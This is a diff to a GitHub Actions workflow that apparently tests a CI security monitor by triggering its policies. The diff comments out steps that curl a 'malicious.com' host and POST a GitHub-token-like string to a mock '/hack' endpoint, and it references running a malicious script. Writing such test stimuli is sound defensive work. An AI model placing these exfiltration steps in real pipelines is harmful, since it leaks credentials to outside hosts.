@@ -42,9 +42,9 @@ jobs:
       #   continue-on-error: true
       #   run: pip install --no-cache-dir --no-deps boto3==1.4.0 --index-url https://test.pypi.org/simple/
 
-      - name: Contact new endpoint
-        continue-on-error: true
-        run: curl https://malicious.com/
+      # - name: Contact new endpoint
+      #   continue-on-error: true
+      #   run: curl https://malicious.com/
 
       # - name: Run unusual command
       #   continue-on-error: true
@@ -64,13 +64,13 @@ jobs:
       # - name: 😈 Execute malicious script
       #   run: bash run_malicious_scripts.sh
 
-      - name: Secret Leak Policy
-        run: |
-          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
-            -H "Content-Type: application/json" \
-            -d '{
-            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-          }'
+      # - name: Secret Leak Policy
+      #   run: |
+      #     curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
+      #       -H "Content-Type: application/json" \
+      #       -d '{
+      #       "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+      #     }'
           
       # - name: Response Status Code Policy (Trigger 400 Bad Request)
       #   run: curl -k -X POST https://api.github.com/endpoint
@@ -78,8 +78,8 @@ jobs:
       # - name: Mime Type Policy
       #   run: curl -s -L "https://tinyurl.com/invisirisk"
 
-      # - name: Install dependencies
-      #   run: pip install -r requirements.txt
+      - name: Install dependencies
+        run: pip install -r requirements.txt
 
       - name: Cleanup PSE
         if: always()
